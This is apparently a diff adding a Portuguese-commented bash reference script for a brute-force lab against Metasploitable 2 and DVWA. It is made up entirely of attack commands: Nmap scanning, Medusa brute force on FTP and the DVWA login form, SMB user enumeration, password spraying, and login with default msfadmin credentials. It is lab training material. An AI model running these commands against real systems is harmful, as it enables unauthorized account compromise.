@@ -1,0 +1,43 @@
+#!/bin/bash
+#
+# lab_commands.sh
+# Referência de comandos utilizados no laboratório de força bruta
+# (Kali Linux + Medusa + Metasploitable 2 + DVWA)
+#
+# USO: este script é apenas DOCUMENTAÇÃO/REFERÊNCIA dos comandos executados
+# manualmente durante o laboratório. Ajuste o IP do alvo (TARGET) conforme
+# a sua rede host-only antes de rodar qualquer comando.
+#
+# Execute SOMENTE em ambiente de laboratório isolado e autorizado.
+
+TARGET="192.168.56.20"
+USERLIST="../wordlists/usuarios.txt"
+PASSLIST="../wordlists/senhas.txt"
+SPRAYLIST="../wordlists/senhas_spray.txt"
+
+echo "=== 1. Reconhecimento com Nmap ==="
+nmap -sV -p 21,139,445,80 "$TARGET"
+
+echo ""
+echo "=== 2. Força bruta em FTP ==="
+medusa -h "$TARGET" -U "$USERLIST" -P "$PASSLIST" -M ftp -t 3
+
+echo ""
+echo "=== 3. Ataque ao formulário de login do DVWA ==="
+medusa -h "$TARGET" -U "$USERLIST" -P "$PASSLIST" \
+  -M web-form \
+  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
+  -T 5
+
+echo ""
+echo "=== 4. Enumeração de usuários SMB ==="
+enum4linux -U "$TARGET"
+
+echo ""
+echo "=== 5. Password spraying em SMB ==="
+medusa -h "$TARGET" -U "$USERLIST" -P "$SPRAYLIST" -M smbnt -t 1
+
+echo ""
+echo "=== 6. Validação manual de acessos ==="
+echo "FTP:   ftp $TARGET"
+echo "SMB:   smbclient //$TARGET/tmp -U msfadmin%msfadmin"
